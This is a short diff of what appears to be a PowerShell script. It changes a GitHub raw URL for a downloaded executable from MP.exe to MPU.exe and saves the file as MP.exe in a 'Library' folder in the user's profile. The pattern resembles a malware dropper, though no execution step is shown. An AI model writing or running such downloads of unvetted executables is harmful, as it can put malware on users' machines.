@@ -1,4 +1,4 @@
-$url = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/MP.exe"
+$url = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/MPU.exe"
 $outputFolder = "$($env:USERPROFILE)\Library"
 $outputFile = "$outputFolder\MP.exe"
 
